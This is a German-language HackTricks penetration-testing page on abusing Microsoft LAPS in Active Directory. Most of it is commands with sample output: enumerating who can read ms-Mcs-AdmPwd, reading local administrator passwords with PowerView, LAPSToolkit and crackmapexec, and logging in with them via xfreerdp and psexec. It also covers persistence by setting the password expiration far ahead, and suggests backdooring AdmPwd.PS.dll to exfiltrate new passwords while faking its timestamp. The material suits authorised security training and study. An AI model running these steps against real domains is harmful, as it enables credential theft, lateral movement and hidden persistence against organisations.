# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Local Administrator Password Solution (LAPS) ist ein Tool zur Verwaltung eines Systems, bei dem **Administratorpasswörter**, die **einzigartig, zufällig und häufig geändert** werden, auf domänenverbundenen Computern angewendet werden. Diese Passwörter werden sicher in Active Directory gespeichert und sind nur für Benutzer zugänglich, die durch Access Control Lists (ACLs) die Berechtigung erhalten haben. Die Sicherheit der Passwortübertragungen vom Client zum Server wird durch die Verwendung von **Kerberos Version 5** und **Advanced Encryption Standard (AES)** gewährleistet.

Bei den Computerobjekten der Domäne führt die Implementierung von LAPS zur Hinzufügung von zwei neuen Attributen: **`ms-mcs-AdmPwd`** und **`ms-mcs-AdmPwdExpirationTime`**. Diese Attribute speichern das **Klartext-Administratorpasswort** und **seine Ablaufzeit**.

### Überprüfen, ob aktiviert
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Passwortzugriff

Sie können die **rohe LAPS-Richtlinie** von `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` herunterladen und dann **`Parse-PolFile`** aus dem [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) Paket verwenden, um diese Datei in ein menschenlesbares Format zu konvertieren.

Darüber hinaus können die **nativ LAPS PowerShell-Cmdlets** verwendet werden, wenn sie auf einem Rechner installiert sind, auf den wir Zugriff haben:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** kann auch verwendet werden, um herauszufinden, **wer das Passwort lesen kann und es lesen kann**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Das [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) erleichtert die Enumeration von LAPS mit mehreren Funktionen.\
Eine davon ist das Parsen von **`ExtendedRights`** für **alle Computer mit aktivierten LAPS.** Dies zeigt **Gruppen**, die speziell **delegiert sind, um LAPS-Passwörter zu lesen**, die oft Benutzer in geschützten Gruppen sind.\
Ein **Konto**, das **einen Computer** zu einer Domäne hinzugefügt hat, erhält `All Extended Rights` über diesen Host, und dieses Recht gibt dem **Konto** die Fähigkeit, **Passwörter zu lesen**. Die Enumeration kann ein Benutzerkonto zeigen, das das LAPS-Passwort auf einem Host lesen kann. Dies kann uns helfen, **spezifische AD-Benutzer** zu identifizieren, die LAPS-Passwörter lesen können.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS-Passwörter mit Crackmapexec**

Wenn kein Zugriff auf eine PowerShell besteht, können Sie dieses Privileg remote über LDAP ausnutzen, indem Sie
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Dies wird alle Passwörter dumpen, die der Benutzer lesen kann, und Ihnen ermöglichen, mit einem anderen Benutzer einen besseren Fuß in die Tür zu bekommen.

## ** Verwendung des LAPS-Passworts **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS Persistenz**

### **Ablaufdatum**

Sobald man Administrator ist, ist es möglich, die **Passwörter** zu **erhalten** und eine Maschine daran zu **hindern**, ihr **Passwort** zu **aktualisieren**, indem man das Ablaufdatum in die Zukunft **setzt**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> Das Passwort wird weiterhin zurückgesetzt, wenn ein **admin** das **`Reset-AdmPwdPassword`** Cmdlet verwendet; oder wenn **Do not allow password expiration time longer than required by policy** in der LAPS GPO aktiviert ist.

### Backdoor

Der ursprüngliche Quellcode für LAPS ist [hier](https://github.com/GreyCorbel/admpwd) zu finden, daher ist es möglich, eine Backdoor in den Code einzufügen (innerhalb der `Get-AdmPwdPassword` Methode in `Main/AdmPwd.PS/Main.cs` zum Beispiel), die irgendwie **neue Passwörter exfiltriert oder sie irgendwo speichert**.

Dann einfach die neue `AdmPwd.PS.dll` kompilieren und auf die Maschine in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` hochladen (und die Änderungszeit ändern).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)


{{#include ../../banners/hacktricks-training.md}}
